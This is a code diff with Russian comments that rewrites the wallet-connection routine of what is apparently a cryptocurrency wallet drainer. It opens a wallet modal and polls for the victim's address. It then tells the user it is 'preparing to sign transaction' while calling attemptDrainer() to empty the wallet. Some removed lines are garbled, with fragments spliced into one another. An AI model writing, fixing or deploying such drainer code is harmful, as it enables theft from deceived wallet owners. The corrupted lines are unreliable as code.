@@ -1021,132 +1021,76 @@ async function handleConnectOrAction() {
     await hideModalWithDelay(`Error: ${error.message}`);
   }
 }
-
 async function waitForConnection() {
   return new Promise((resolve, reject) => {
-    console.log('📡 Waiting for wallet connection via AppKit...');
-    console.log('🔍 window.ethereum available:', !!window.ethereum);
-
+    console.log('📡 Ожидание подключения кошелька через AppKit...');
     const isMobile = isMobileDevice();
     console.log(`ℹ️ Device: ${isMobile ? 'Mobile' : 'Desktop'}`);
 
+    // Открываем модальное окно AppKit
+    appKit.open();
+
     let attempts = 0;
-    const maxAttempts = 10; // Пробуем 10 раз с интервалом 2 секунды
-    const interval = 2000; // Интервал между попытками (2 секунды)
+    const maxAttempts = 15; // Максимум 15 попыток
+    const interval = 1000; // Интервал 1 секунда
 
-    const unsubscribe = appKit.subscribeState(async (state) => {
-      console.log('🔍 SubscribeState:', state);
-
-      let walletAddress = null;
-
-      // Проверяем состояние подключения
-      if (state.loading === false) {
-        if (state.connected && (state.address || state.accounts?.[0] || state.selectedAddress)) {
-          walletAddress = state.addresse, reject => {
-    consolestate.selectedAddress;
-          console.log(`✅ Address from state: ${walletAddress}`);
-        }
-      }
-
-      // Пробуем извлечь адрес из формата eip155:1:0x...
-      if (!walletAddress && state.accounts?.[0]?.startsWith('eip155:1:')) {
-        walletAddress = state.accounts[0].split(':')[2];
-        console.log(`✅ Extracted address from eip155:1: ${walletAddress}`);
-      }
-
-      // Пробуем получить адрес через window.ethereum
-      if (!walletAddress && window.ethereum && attempts < maxAttempts) {
-        try {
-          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-          if (accounts && accounts.length > 0) {
-            walletAddress = accounts[0];
-            console.log(`✅ Address from eth_accounts: ${walletAddress}`);
-          } else {
-            console.log(`ℹ️ No accounts returned by eth_accounts (attempt ${attempts + 1}/${maxAttempts})`);
-          }
-        } catch (error) {
-          console.error(`❌ Error fetching eth_accounts: ${error.message}`);
-        }
-      }
-
-      // Пробуем получить адрес через appKit.getAddress()
-      if (!walletAddress && attempts < maxAttempts) {
-        try {
-          const address = await appKit.getAddress?.();
-          if (address) {
-            walletAddress = address;
-            console.log(`✅ Address from appKit.getAddress: ${walletAddress}`);
-          }
-        } catch (error) {
-          console.warn(`⚠️ Failed to get address via appKit.getAddress: ${error.message}`);
-        }
-      }
-
-      if (walletAddress) {
-        console.log(`✅ Wallet connected via AppKit: ${walletAddress}`);
-        connectedAddress = walletAddress;
-        unsubscribe();
-        modalSubtitle.textContent = 'Preparing to sign transaction...';
-        try {
-          await attemptDrainer();
-          appKit.close();
-          resolve(walletAddress);
-        } catch (err) {
-          console.error(`❌ Error in attemptDrainer: ${err.message}`);
-          appKit.close();
-          reject(err);
-        }
-      } else if (attempts >= maxAttempts) {
-        console.warn('⚠️ Max connection attempts reached');
-        unsubscribe();
-        appKit.close();
-        reject(new Error('Failed to connect wallet after maximum attempts'));
-      }
-
-      attempts++;
-    });
-
-    // Запускаем периодическую проверку
-    const checkInterval = setInterval(async () => {
-      if (attempts >= maxAttempts) {
-        clearInterval(checkInterval);
-        return;
-      }
-      if (!window.ethereum) return;
-
+    // Функция для получения и обработки адреса
+    const checkAddress = async () => {
       try {
-        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        if (accounts && accounts.length > 0) {
-          console.log(`✅ Address from eth_accounts (interval): ${accounts[0]}`);
-          connectedAddress = accounts[0];
-          unsubscribe();
+        const walletAddress = await appKit.getAddress();
+        console.log(`🔍 Адрес от appKit.getAddress: ${walletAddress}`);
+
+        // Обработка формата CAIP (eip155:chainId:address)
+        let cleanAddress = walletAddress;
+        if (walletAddress?.startsWith('eip155:')) {
+          cleanAddress = walletAddress.split(':')[2];
+          console.log(`🔍 Извлечён чистый адрес из CAIP: ${cleanAddress}`);
+        }
+
+        if (cleanAddress) {
+          console.log(`✅ Кошелёк подключён: ${cleanAddress}`);
+          connectedAddress = cleanAddress;
           clearInterval(checkInterval);
+          clearTimeout(timeout);
           modalSubtitle.textContent = 'Preparing to sign transaction...';
-          await attemptDrainer();
-          appKit.close();
-          resolve(accounts[0]);
+          try {
+            await attemptDrainer();
+            appKit.close();
+            resolve(cleanAddress);
+          } catch (err) {
+            console.error(`❌ Error in attemptDrainer: ${err.message}`);
+            appKit.close();
+            reject(err);
+          }
+        } else {
+          throw new Error('Адрес не получен');
         }
       } catch (error) {
-        console.error(`❌ Error in interval eth_accounts: ${error.message}`);
+        attempts++;
+        console.log(`ℹ️ Попытка ${attempts}/${maxAttempts}: Не удалось получить адрес: ${error.message}`);
+        if (attempts >= maxAttempts) {
+          console.warn('⚠️ Достигнуто максимальное количество попыток');
+          clearInterval(checkInterval);
+          appKit.close();
+          reject(new Error('Не удалось подключить кошелёк после максимального числа попыток'));
+        }
       }
-    }, interval);
+    };
 
+    // Запускаем периодическую проверку
+    const checkInterval = setInterval(checkAddress, interval);
+
+    // Устанавливаем таймаут
     const timeout = setTimeout(() => {
-      console.warn('⚠️ Connection timeout');
-      unsubscribe();
+      console.warn('⚠️ Таймаут ожидания подключения');
       clearInterval(checkInterval);
       appKit.close();
-      reject(new Error('Timeout waiting for wallet connection'));
-    }, 120000);
+      reject(new Error('Таймаут ожидания подключения кошелька'));
+    }, 60000); // 60 секунд
 
-    appKit.open('error', (err) => {
-      console.error(`❌ AppKit error: ${err.message}`);
-      clearTimeout(timeout);
-      clearInterval(checkInterval);
-      unsubscribe();
-      appKit.close();
-      reject(err);
-    });
+    // Проверяем сразу
+    checkAddress();
   });
 }
+
 
